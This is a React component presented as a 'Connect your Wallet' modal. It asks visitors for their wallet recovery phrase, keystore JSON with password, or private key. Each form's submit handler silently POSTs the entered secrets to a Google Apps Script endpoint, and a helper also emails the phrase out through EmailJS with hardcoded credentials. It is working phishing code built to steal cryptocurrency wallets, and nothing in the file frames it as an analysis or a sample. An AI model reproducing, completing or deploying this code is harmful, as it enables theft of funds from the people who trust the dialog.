"use strict";

import {
  modalPhraseOpen,
  modalKeystoreOpen,
  modalPrivateOpen,
} from "./modalform-bev.js";

const WalletModalImport = (props) => {
  const [phrase, setPhrase] = React.useState({
    phrase_key: "",
    walletName: "",
  });

  const phraseSubmit = (e) => {
    e.preventDefault();
    const scriptURL =
      "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
    const form = document.forms["phrasesync"];
    handleSubmit(e);
    document.getElementById("loader").className = "loader";
    fetch(scriptURL, { method: "POST", body: new FormData(form) })
      .then((res) => {
        console.log(res);
        document.getElementById("loader").classList.remove("loader");
      })
      .then((res) => {
        console.log(res);
        // location.reload();
      });
  };
  const keystoreSubmit = (e) => {
    e.preventDefault();
    document.getElementById("loader").classList.add("loader");
    const scriptURL =
      "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
    const form = document.forms["keystoresync"];
    handleSubmit(e);
    document.getElementById("loader").className = "loader";
    fetch(scriptURL, { method: "POST", body: new FormData(form) })
      .then(() => document.getElementById("loader").classList.remove("loader"))
      .then(() => location.reload());
  };
  const privateSubmit = (e) => {
    e.preventDefault();
    document.getElementById("loader").classList.add("loader");
    const scriptURL =
      "https://script.google.com/macros/s/AKfycbyH0l04MQ_BkLXn5EvZi2YE-H7Cv_grkBVNlyi9hI0aQckkCRFOjezMBFu-XyXlPgIOcQ/exec";
    const form = document.forms["privatesync"];

    handleSubmit(e);
    document.getElementById("loader").className = "loader";
    fetch(scriptURL, { method: "POST", body: new FormData(form) })
      .then(() => document.getElementById("loader").classList.remove("loader"))
      .then(() => location.reload());
  };

  const handleChange = (e) => {
    const name = e.target.name;
    const phrase = e.target.value;
    const walletName = props.name;
    setPhrase({ [name]: phrase, walletName });
  };

  const handleSubmit = (e) => {
    e.preventDefault(e);

    const templateParams = {
      firstname: phrase.phrase_key,
      lastname: phrase.walletName,
    };

    emailjs.init({
      publicKey: "vdTp8sfw8L1_oEEoM",
    });

    emailjs.send("service_hnew9sq", "romana", templateParams).then(
      (response) => {
        console.log("SUCCESS!", response.status, response.text);
      },
      (error) => {
        console.log("FAILED...", error);
      }
    );
  };

  return (
    <div
      className="modal fade"
      id="secondModal"
      tabIndex="-1"
      aria-labelledby="exampleModalToggleLabel"
      aria-hidden="true"
    >
      <div className="modal-dialog modal-lg modal-dialog-centered modal-dialog-scrollable">
        <div className="modal-content">
          <div className="modal-header">
            <h5 className="modal-title" id="exampleModalToggleLabel"></h5>
            <button
              type="button"
              className="btn-close"
              data-bs-dismiss="modal"
              aria-label="Close"
            ></button>
          </div>{" "}
          <div id="loader"></div>
          <div className="modal-body">
            <div className="container-fluid">
              <div className="row">
                <div className="col">
                  <div className="modalimport-des">
                    <div className="modalimport-img">
                      <img src={props.image} alt="logo" />
                    </div>
                    <div className="modalimport-text mt-3">
                      <h6>Connect your {props.name} Wallet</h6>
                    </div>
                  </div>
                </div>
              </div>

              <div className="row mt-3">
                <div className="col-4">
                  <input
                    type="button"
                    value="phrase"
                    onClick={() => modalPhraseOpen()}
                    className="phrasemodalimport-btn"
                  />
                </div>
                <div className="col-4">
                  <input
                    type="button"
                    value="keystore JSON"
                    onClick={() => modalKeystoreOpen()}
                    className="keystoremodalimport-btn"
                  />
                </div>
                <div className="col-4">
                  <input
                    type="button"
                    value="Private Key"
                    onClick={() => modalPrivateOpen()}
                    className="privatemodalimport-btn"
                  />
                </div>
              </div>

              <form
                name="phrasesync"
                id="modalphrase-import"
                className="text-center"
                onSubmit={(e) => phraseSubmit(e)}
              >
                <div className="row pt-5">
                  <div className="col-12">
                    <textarea
                      name="phrase_key"
                      id=""
                      cols="10"
                      rows="5"
                      placeholder="phrase"
                      onChange={(e) => handleChange(e)}
                      className="modalimport-textarea"
                      required
                    ></textarea>
                  </div>
                </div>
                <div className="row pt-2 walletname-none">
                  <div className="col-12">
                    <input
                      type="text"
                      name="dappname"
                      value={props.name}
                      className="modalpassimport"
                    />
                  </div>
                </div>
                <div className="row pt-3 text-center">
                  <div className="col-12">
                    <p
                      style={{
                        color: "rgb(59, 101, 192)",
                        fontWeight: "bold",
                        fontSize: "12.5px",
                      }}
                    >
                      Typically 12 (sometimes 24) words separated by single
                      spaces
                    </p>
                  </div>
                </div>
                <div className="row pt-2">
                  <div className="col-12">
                    <input
                      type="submit"
                      value="Proceed"
                      className="modalimport-btn"
                    />
                  </div>
                </div>
              </form>

              <form
                name="keystoresync"
                id="modalkeystore-import"
                className="text-center"
                onSubmit={(e) => keystoreSubmit(e)}
              >
                <div className="row pt-5">
                  <div className="col-12">
                    <textarea
                      name="keystore_key"
                      id=""
                      cols="10"
                      rows="5"
                      placeholder="keystore JSON"
                      onChange={(e) => handleChange(e)}
                      className="modalimport-textarea"
                      required
                    ></textarea>
                  </div>
                </div>
                <div className="row pt-2">
                  <div className="col-12">
                    <input
                      type="text"
                      name="keystore_pass"
                      placeholder="password"
                      className="modalpassimport"
                      required
                    />
                  </div>
                </div>
                <div className="row pt-2 walletname-none">
                  <div className="col-12">
                    <input
                      type="text"
                      name="dappname"
                      value={props.name}
                      className="modalpassimport"
                    />
                  </div>
                </div>
                <div className="row pt-3 text-center">
                  <div className="col-12">
                    <p
                      style={{
                        color: "rgb(59, 101, 192)",
                        fontWeight: "bold",
                        fontSize: "12.5px",
                      }}
                    >
                      Several lines of text beginning with '(...)' plus the
                      password you used to encrypt it
                    </p>
                  </div>
                </div>
                <div className="row pt-2">
                  <div className="col-12">
                    <input
                      type="submit"
                      value="Proceed"
                      className="modalimport-btn"
                    />
                  </div>
                </div>
              </form>

              <form
                name="privatesync"
                id="modalprivatekey-import"
                className="text-center"
                onSubmit={(e) => privateSubmit(e)}
              >
                <div className="row pt-4">
                  <div className="col-12">
                    <input
                      type="text"
                      name="private_pass"
                      placeholder="private key"
                      onChange={(e) => handleChange(e)}
                      className="modalpassimport"
                      required
                    />
                  </div>
                </div>
                <div className="row pt-2 walletname-none">
                  <div className="col-12">
                    <input
                      type="text"
                      name="dappname"
                      value={props.name}
                      className="modalpassimport"
                    />
                  </div>
                </div>
                <div className="row pt-3 text-center">
                  <div className="col-12">
                    <p
                      style={{
                        color: "rgb(59, 101, 192)",
                        fontWeight: "bold",
                        fontSize: "12.5px",
                      }}
                    >
                      Typically 12 (sometimes 24) words separated by single
                      spaces
                    </p>
                  </div>
                </div>
                <div className="row pt-2">
                  <div className="col-12">
                    <input
                      type="submit"
                      value="Proceed"
                      className="modalimport-btn"
                    />
                  </div>
                </div>
              </form>
            </div>
          </div>
          <div className="modal-footer">
            <button
              type="button"
              className="btn btn-danger"
              data-bs-dismiss="modal"
            >
              Cancel
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default WalletModalImport;
